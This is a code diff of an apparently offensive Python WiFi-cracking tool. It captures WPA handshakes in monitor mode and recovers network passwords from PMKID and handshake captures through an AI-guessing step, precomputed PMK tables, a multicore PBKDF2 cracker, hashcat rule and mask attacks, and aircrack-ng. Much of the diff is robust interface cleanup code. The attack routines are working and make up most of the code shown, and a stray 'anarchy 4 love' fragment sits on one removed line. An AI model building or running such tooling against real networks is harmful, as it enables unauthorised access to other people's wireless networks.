-    password = run_hashcat_attack(hash_file, wordlist, pot_file,
-                                  label='stage1-plain')
-    divider()
-    if password:
-        ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
-        return password
-    warn("Stage 1: not found")
-
-    # ── Stage 2: best64 rules ────────────────────────────────────────
-    rule = rules.get('best64')
-    if rule:
-        section_inner("Stage 2/5 — best64 rule mutations")
-        divider()
-        password = run_hashcat_attack(hash_file, wordlist, pot_file,
-                                      extra_args=['-r', rule],
-                                      label='stage2-best64')
-        divider()
-        if password:
-            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
-            return password
-        warn("Stage 2: not found")
+    if entries:
+        info(f"Found {c(str(len(entries)), C.BYELLOW)} PMKID entry/entries  ·  "
+             f"SSID: {c(ssid, C.BWHITE)}")
     else:
-        warn("best64.rule not found — skipping stage 2")
+        warn("No WPA*01 PMKID lines found — file may only contain EAPOL (WPA*02)")
 
-    # ── Stage 3: dive rules (more mutations) ─────────────────────────
-    rule = rules.get('dive')
-    if rule:
-        section_inner("Stage 3/5 — dive rule mutations (larger set)")
-        divider()
-        password = run_hashcat_attack(hash_file, wordlist, pot_file,
-                                      extra_args=['-r', rule],
-                                      label='stage3-dive')
-        divider()
-        if password:
-            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
-            return password
-        warn("Stage 3: not found")
-    else:
-        warn("dive.rule not found — skipping stage 3")
-
-    # ── Stage 4: Combinator (wordlist + wordlist, -a 1) ──────────────
-    section_inner("Stage 4/5 — combinator (word + word passphrases)")
-    divider()
-    password = run_hashcat_attack(hash_file, wordlist, pot_file,
-                                  extra_args=['-a', '1', wordlist],
-                                  label='stage4-combinator')
-    divider()
-    if password:
-        ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
+    def success(password, method):
+        print()
+        print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
+        print(f"  {('CRACKED via ' + method).center(60)}")
+        print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
+        print()
+        print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
+        print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
+        print()
         return password
-    warn("Stage 4: not found")
 
-    # ── Stage 5: Mask — 8-digit PINs and common router defaults ──────
-    section_inner("Stage 5/5 — mask attack (8-digit PINs & short patterns)")
-    masks = [
-        '?d?d?d?d?d?d?d?d',          # 8 digits  (ISP default PINs)
-        '?d?d?d?d?d?d?d?d?d?d',      # 10 digits
-        '?l?l?l?l?l?l?l?l',          # 8 lowercase letters
-        '?u?l?l?l?l?l?l?d',          # Cap + 6 lower + digit
-    ]
-    for mask in masks:
-        divider()
-        info(f"Mask:  {c(mask, C.DIM)}")
-        password = run_hashcat_attack(hash_file, mask, pot_file,
-                                      extra_args=['-a', '3'],
-                                      label=f'stage5-mask-{mask[:8]}')
+    # ── Method 0: AI-assisted (DeepSeek) — targeted candidates first ─
+    if entries and ssid:
+        password = ai_crack_pmkid(entries, bssid, ssid)
         if password:
-            divider()
-            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
-            return password
-    divider()
-    warn("Stage 5: not found")
+            return success(password, 'DeepSeek AI')
 
-    err("All hashcat stages exhausted — password not found")
-    info("Try supplying a more targeted wordlist next run")
+    # ── Method 1: Precomputed PMK table (instant lookup) ─────────────
+    if ssid:
+        db_path  = get_pmk_db_path(ssid)
+        cow_path = get_cowpatty_table_path(ssid)
+        has_table = (os.path.exists(db_path) and os.path.getsize(db_path) > 0) or \
+                    (os.path.exists(cow_path) and os.path.getsize(cow_path) > 0)
+
+        if has_table:
+            section("PMK Table Lookup  (precomputed — instant)")
+            password = crack_with_pmk_table(hash_file, ssid, bssid, cap_file=None)
+            if password:
+                return success(password, 'PMK Rainbow Table')
+            warn("PMK table miss — password not in precomputed table")
+        else:
+            info(f"No PMK table for SSID  {c(ssid, C.BWHITE)}  — offer to build after cracking")
+            resp = ask("Build PMK table in background while cracking continues? [y/N]")
+            if resp.strip().lower() == 'y':
+                def build_bg():
+                    build_pmk_table(ssid, wordlist,
+                                    method='airolib' if check_tool('airolib-ng') else 'cowpatty')
+                threading.Thread(target=build_bg, daemon=True).start()
+                info("Building PMK table in background…")
+
+    # ── Method 2: Pure Python multicore ──────────────────────────────
+    if entries:
+        section("Pure-Python PMKID Cracker  (all CPU cores)")
+        password = crack_pmkid_pure_python(entries, wordlist)
+        if password:
+            return success(password, 'Pure-Python PBKDF2')
+        warn("Pure-Python cracker: password not in wordlist")
+
+    # ── Method 3: hashcat (if OpenCL available) ───────────────────────
+    if check_tool('hashcat') and hashcat_is_functional():
+        info("Trying hashcat (GPU-accelerated)…")
+        pot_file    = f'/tmp/niixkey_{int(time.time())}.pot'
+        rules       = find_hashcat_rules()
+        bundled_dir = get_bundled_rules_dir()
+        if 'best64' not in rules:
+            b = os.path.join(bundled_dir, 'best64.rule')
+            if os.path.exists(b):
+                rules['best64'] = b
+        password = None
+        si = lambda lbl: info(f"  hashcat: {c(lbl, C.BYELLOW)}")
+        si("plain wordlist")
+        password = run_hashcat_attack(hash_file, wordlist, pot_file, label='hc-plain')
+        if not password and rules.get('best64'):
+            si("best64 rules")
+            password = run_hashcat_attack(hash_file, wordlist, pot_file,
+                                          extra_args=['-r', rules['best64']], label='hc-best64')
+        if not password:
+            for mask in ['?d?d?d?d?d?d?d?d', '?d?d?d?d?d?d?d?d?d?d']:
+                si(f"mask {mask}")
+                password = run_hashcat_attack(hash_file, mask, pot_file,
+                                              extra_args=['-a', '3'], label='hc-mask')
+                if password:
+                    break
+        if password:
+            return success(password, 'hashcat')
+        warn("hashcat: password not found")
+
+    # ── Method 4: aircrack-ng via pcapng conversion ───────────────────
+    ts_part    = os.path.basename(hash_file).replace('pmkid_', '').replace('.hc22000', '')
+    pcapng_tmp = f'/tmp/pmkid_{ts_part}.pcapng'
+    if os.path.exists(pcapng_tmp) and os.path.getsize(pcapng_tmp) > 100:
+        converter = next(
+            (cv for cv in ['hcxpcapngtool', 'hcxpcaptool'] if check_tool(cv)), None
+        )
+        if converter:
+            hccapx = pcapng_tmp.replace('.pcapng', '.hccapx')
+            try:
+                subprocess.run([converter, f'--hccapx={hccapx}', pcapng_tmp],
+                               capture_output=True, timeout=15)
+            except Exception as e:
+                warn(f"hccapx conversion: {e}")
+            if os.path.exists(hccapx) and os.path.getsize(hccapx) > 0:
+                info("Running aircrack-ng on converted capture…")
+                password = None
+                try:
+                    proc = subprocess.Popen(
+                        ['aircrack-ng', '-w', wordlist, hccapx],
+                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+                    )
+                    for line in proc.stdout:
+                        s = line.strip()
+                        if 'KEY FOUND!' in s:
+                            m = re.search(r'\[\s*(.+?)\s*\]', s)
+                            if m:
+                                password = m.group(1).strip()
+                            break
+                        elif any(k in s for k in ('Tested', '%')):
+                            print(f"  {c(s, C.DIM)}", end='\r', flush=True)
+                    proc.wait()
+                    print()
+                except Exception as e:
+                    warn(f"aircrack-ng error: {e}")
+                if password:
+                    return success(password, 'aircrack-ng')
+
+    warn("All PMKID crack methods exhausted — password not in rockyou.txt")
+    if ssid:
+        info(f"Tip: build a PMK table for '{ssid}' — next crack will be instant")
     return None
-
-
 
 
 def crack_wpa_password(capture_file, bssid):
@@ -2212,11 +3034,51 @@ def crack_wpa_password(capture_file, bssid):
     cap_file = sorted(cap_files)[0]
     info(f"Capture file:  {c(cap_file, C.BWHITE)}")
 
+    # Try to extract SSID from cap filename for PMK table lookup
+    # Filename pattern: handshake_<ssid>-01.cap
+    ssid_guess = None
+    m = re.match(r'handshake_(.+?)-\d+\.cap', os.path.basename(cap_file))
+    if m:
+        ssid_guess = m.group(1).replace('_', ' ').strip()
+
     wordlist = find_or_fetch_wordlist()
     info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
     print()
 
     password = None
+
+    # ── Method 0a: AI-assisted (DeepSeek) — targeted candidates first ─
+    if ssid_guess:
+        password = ai_crack_handshake(cap_file, bssid, ssid_guess)
+        if password:
+            print()
+            print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
+            print(f"  {'CRACKED via DeepSeek AI':^60}")
+            print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
+            print()
+            print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
+            print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
+            print()
+            return password
+
+    # ── Method 0b: PMK table lookup (instant if table exists) ─────────
+    if ssid_guess:
+        db_path  = get_pmk_db_path(ssid_guess)
+        cow_path = get_cowpatty_table_path(ssid_guess)
+        if (os.path.exists(db_path) and os.path.getsize(db_path) > 0) or \
+           (os.path.exists(cow_path) and os.path.getsize(cow_path) > 0):
+            info(f"Precomputed PMK table found for SSID  {c(ssid_guess, C.BWHITE)}")
+            password = crack_with_pmk_table(None, ssid_guess, bssid, cap_file=cap_file)
+            if password:
+                print()
+                print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
+                print(f"  {'PMK TABLE HIT — PASSWORD FOUND':^60}")
+                print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
+                print()
+                print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
+                print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
+                print()
+                return password
     rules    = find_hashcat_rules()
     pot_file = f'/tmp/niixkey_hs_{int(time.time())}.pot'
 
@@ -2422,6 +3284,7 @@ def capture_handshake(interface, bssid, channel, ssid):
                        capture_output=True, timeout=10)
 
         info(f"Enabling monitor mode on {c(interface, C.BWHITE)}…")
+        ORIGINAL_IFACE = interface   # track so cleanup always knows the real name
         subprocess.run(['sudo', 'airmon-ng', 'start', interface, str(channel)],
                        capture_output=True, timeout=15)
 
@@ -2616,41 +3479,244 @@ def auto_connect(ssid, password, interface):
     return False
 
 
-def cleanup():
-    """Cleanup resources and restore network."""
-    global MONITOR_IFACE
-    print()
-    info("Cleaning up…")
-
-    if MONITOR_IFACE:
-        try:
-            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
-                           capture_output=True, timeout=10)
-            MONITOR_IFACE = None
-        except Exception:
-            pass
-
+def restore_interface_to_managed(iface):
+    """
+    Force a single interface back to managed mode using every available method.
+    Called per-interface so it works even when airmon-ng fails.
+    """
+    if not iface:
+        return
     try:
-        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
-        if result.returncode == 0:
-            iface = None
-            in_iface = False
-            for line in result.stdout.split('\n'):
-                line = line.strip()
-                if line.startswith('Interface'):
-                    iface = line.split()[1]
-                    in_iface = True
-                elif in_iface and 'type monitor' in line and iface:
-                    subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
-                                   capture_output=True, timeout=5)
-                    in_iface = False
-                elif line == '':
-                    in_iface = False
+        # Method 1: airmon-ng stop (handles renamed interfaces like wlan1mon)
+        subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
+                       capture_output=True, timeout=10)
+    except Exception:
+        pass
+    try:
+        # Method 2: iw + ip — works even if airmon-ng is unavailable
+        subprocess.run(['sudo', 'ip',  'link', 'set', iface, 'down'],
+                       capture_output=True, timeout=5)
+        subprocess.run(['sudo', 'iw',  'dev',  iface, 'set', 'type', 'managed'],
+                       capture_output=True, timeout=5)
+        subprocess.run(['sudo', 'ip',  'link', 'set', iface, 'up'],
+                       capture_output=True, timeout=5)
     except Exception:
         pass
 
-    restart_network_manager()
+
+def find_all_monitor_interfaces():
+    """
+    Scan every wireless interface on the system and return those in monitor mode.
+    Catches interfaces the script created but lost track of (crash mid-run, etc.)
+    """
+    monitors = []
+    try:
+        r = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
+        current_iface = None
+        for line in r.stdout.splitlines():
+            line = line.strip()
+            if line.startswith('Interface'):
+                current_iface = line.split()[1]
+            elif 'type monitor' in line and current_iface:
+                monitors.append(current_iface)
+                current_iface = None
+    except Exception:
+        pass
+    return monitors
+
+
+def cleanup():
+    """
+    Bulletproof cleanup — restores WiFi to managed mode.
+    Registered via atexit AND signal handlers so it runs on:
+      - Normal exit        - Ctrl+C (SIGINT)
+      - Unhandled crash    - SIGTERM (kill)
+      - Any sys.exit()
+    Idempotent — safe to call multiple times.
+    """
+    global MONITOR_IFACE, ORIGINAL_IFACE, _CLEANUP_DONE
+    if _CLEANUP_DONE:
+        return
+    _CLEANUP_DONE = True
+
+    print()
+    info("Cleaning up — restoring WiFi interface…")
+
+    # ── 1. Kill stray capture/injection/scan processes ────────────────
+    for proc_name in ('airodump-ng', 'aireplay-ng', 'hcxdumptool', 'airmon-ng'):
+        try:
+            subprocess.run(['sudo', 'pkill', '-9', '-f', proc_name],
+                           capture_output=True, timeout=5)
+        except Exception:
+            pass
+
+    time.sleep(0.5)   # let killed processes release the interface
+
+    # ── 2. Stop the tracked monitor interface ─────────────────────────
+    if MONITOR_IFACE:
+        restore_interface_to_managed(MONITOR_IFACE)
+        MONITOR_IFACE = None
+
+    # ── 3. Scan and stop ALL monitor-mode interfaces on the system ────
+    # Catches interfaces created but lost track of (crash mid-setup, etc.)
+    for mon in find_all_monitor_interfaces():
+        restore_interface_to_managed(mon)
+
+    # ── 4. Explicitly restore the original adapter by name ────────────
+    # Even if airmon-ng renamed it (wlan1 → wlan1mon), after airmon-ng stop
+    # the original name re-appears. Force it back to managed + up.
+    if ORIGINAL_IFACE:
+        restore_interface_to_managed(ORIGINAL_IFACE)
+        # Make absolutely sure it's up
+        try:
+            subprocess.run(['sudo', 'ip', 'link', 'set', ORIGINAL_IFACE, 'up'],
+                           capture_output=True, timeout=5)
+        except Exception:
+            pass
+
+    # ── 5. Restart NetworkManager so the OS reconnects ────────────────
+    nm_restarted = False
+    for nm_cmd in (
+        ['sudo', 'systemctl', 'restart', 'NetworkManager'],
+        ['sudo', 'service',   'network-manager', 'restart'],
+        ['sudo', 'service',   'networking',       'restart'],
+    ):
+        try:
+            r = subprocess.run(nm_cmd, capture_output=True, timeout=15)
+            if r.returncode == 0:
+                nm_restarted = True
+                break
+        except Exception:
+            continue
+
+    if nm_restarted:
+        time.sleep(2)   # give NM a moment to reconnect
+
+    # ── 6. Final verification ─────────────────────────────────────────
+    remaining = find_all_monitor_interfaces()
+    if remaining:
+        warn(f"Interface(s) still in monitor mode: {c(', '.join(remaining), C.BYELLOW)}")
+        warn("Run manually to fix:")
+        for iface in remaining:
+            print(f"    sudo airmon-ng stop {iface}")
+        print( "    sudo systemctl restart NetworkManager")
+    else:
+        ok("All interfaces restored to managed mode  ✔")
+
     ok("Cleanup complete — network restored")
+
+
+_SIGINT_COUNT = 0
+
+def _signal_cleanup(signum, frame):
+    """
+    Signal handler — runs cleanup then exits.
+    Double Ctrl+C within 2 seconds forces immediate exit (skips cleanup).
+    This prevents getting trapped if cleanup itself hangs.
+    """
+    global _SIGINT_COUNT
+    _SIGINT_COUNT += 1
+    if _SIGINT_COUNT == 1:
+        print()
+        warn(f"Interrupted — restoring WiFi (Ctrl+C again to force quit)…")
+        cleanup()
+        sys.exit(0)
+    else:
+        # Second Ctrl+C — bail immediately, print manual fix command
+        print()
+        warn("Force quit — interface may still be in monitor mode!")
+        warn("Run this to restore WiFi manually:")
+        iface = ORIGINAL_IFACE or MONITOR_IFACE or 'wlan1'
+        mon   = MONITOR_IFACE or f'{iface}mon'
+        print(f"\n  {c(f'sudo airmon-ng stop {mon}; sudo ip link set {iface} down; sudo iw dev {iface} set type managed; sudo ip link set {iface} up; sudo systemctl restart NetworkManager', C.BYELLOW)}\n")
+        os._exit(1)
+
+
+def fix_wifi_now(interface=None):
+    """
+    Standalone WiFi recovery — can be called with --fix-wifi flag.
+    Scans all wireless interfaces, stops any in monitor mode, restores managed.
+    """
+    section("WiFi Interface Recovery")
+    info("Scanning for interfaces stuck in monitor mode…")
+
+    monitors = find_all_monitor_interfaces()
+
+    # Also check common monitor names even if iw dev misses them
+    for candidate in ['wlan0mon', 'wlan1mon', 'wlan2mon', 'mon0', 'mon1']:
+        if os.path.exists(f'/sys/class/net/{candidate}') and candidate not in monitors:
+            monitors.append(candidate)
+
+    if not monitors:
+        ok("No interfaces in monitor mode — WiFi should be working")
+    else:
+        warn(f"Found monitor interfaces: {c(', '.join(monitors), C.BYELLOW)}")
+        for mon in monitors:
+            info(f"Restoring  {c(mon, C.BWHITE)}…")
+            restore_interface_to_managed(mon)
+
+    # Restore all common managed interfaces in case they're down
+    managed_candidates = []
+    if interface:
+        managed_candidates.append(interface)
+    try:
+        r = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
+        for line in r.stdout.splitlines():
+            line = line.strip()
+            if line.startswith('Interface'):
+                iface = line.split()[1]
+                if 'mon' not in iface and iface not in managed_candidates:
+                    managed_candidates.append(iface)
+    except Exception:
+        pass
+
+    for iface in managed_candidates:
+        try:
+            # Ensure managed mode and bring up
+            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'],
+                           capture_output=True, timeout=5)
+            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'],
+                           capture_output=True, timeout=5)
+            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
+                           capture_output=True, timeout=5)
+            ok(f"Interface  {c(iface, C.BWHITE)}  set to managed + up")
+        except Exception as e:
+            warn(f"Could not restore {iface}: {e}")
+
+    # Restart NetworkManager
+    info("Restarting NetworkManager…")
+    for cmd in (['sudo', 'systemctl', 'restart', 'NetworkManager'],
+                ['sudo', 'service', 'network-manager', 'restart'],
+                ['sudo', 'service', 'networking', 'restart']):
+        try:
+            r = subprocess.run(cmd, capture_output=True, timeout=15)
+            if r.returncode == 0:
+                ok("NetworkManager restarted")
+                break
+        except Exception:
+            continue
+
+    time.sleep(2)
+    remaining = find_all_monitor_interfaces()
+    if remaining:
+        warn(f"Still in monitor mode: {', '.join(remaining)}")
+        warn("Run manually:")
+        for m in remaining:
+            print(f"  sudo airmon-ng stop {m}")
+        print("  sudo systemctl restart NetworkManager")
+    else:
+        ok("All interfaces restored — WiFi should reconnect within a few seconds")
+
+
+# Register cleanup to run no matter how the script exits
+atexit.register(cleanup)
+signal.signal(signal.SIGINT,  _signal_cleanup)   # Ctrl+C
+signal.signal(signal.SIGTERM, _signal_cleanup)   # kill
+try:
+    signal.signal(signal.SIGHUP, _signal_cleanup)    # terminal closed
+except AttributeError:
+    pass
+
 
 
 def show_banner():
@@ -2679,6 +3745,19 @@ def show_banner():
 
 def main():
     """Main entry point."""
+
+    # ── --fix-wifi: restore stuck monitor interfaces without running the tool ──
+    if '--fix-wifi' in sys.argv or '--fix' in sys.argv:
+        os.system('clear')
+        show_banner()
+        # Can run as root or non-root (sudo will be invoked per-command)
+        iface_arg = None
+        for arg in sys.argv:
+            if arg.startswith('--iface='):
+                iface_arg = arg.split('=', 1)[1]
+        fix_wifi_now(interface=iface_arg)
+        sys.exit(0)
+
     os.system('clear')
     show_banner()
 
@@ -2742,6 +3821,11 @@ def main():
         interface = interfaces[0]
         info(f"Using interface:  {c(interface, C.BWHITE, C.BOLD)}")
 
+    # Track the original interface name so cleanup can restore it
+    # even if airmon-ng renames it (wlan1 → wlan1mon)
+    global ORIGINAL_IFACE
+    ORIGINAL_IFACE = interface
+
     # ── Network scan ──────────────────────────────────────
     section("Network Scan")
     networks = scan_networks(interface)
@@ -2791,7 +3875,7 @@ def main():
         sys.exit(0)
 
     if not selected.channel:
-        selected = selected._replace(channel=1)anarchy 4 love
+        selected = selected._replace(channel=1)
         warn("Channel unknown — defaulting to ch 1")
 
     # ── Attack routing based on security type ─────────────
@@ -2881,13 +3965,10 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print()
-        warn("Interrupted by user")
-        cleanup()
+        # Signal handler will call cleanup(); just exit quietly
         sys.exit(0)
     except Exception as e:
         err(f"Unexpected error: {e}")
         import traceback
         traceback.print_exc()
-        cleanup()
         sys.exit(1)
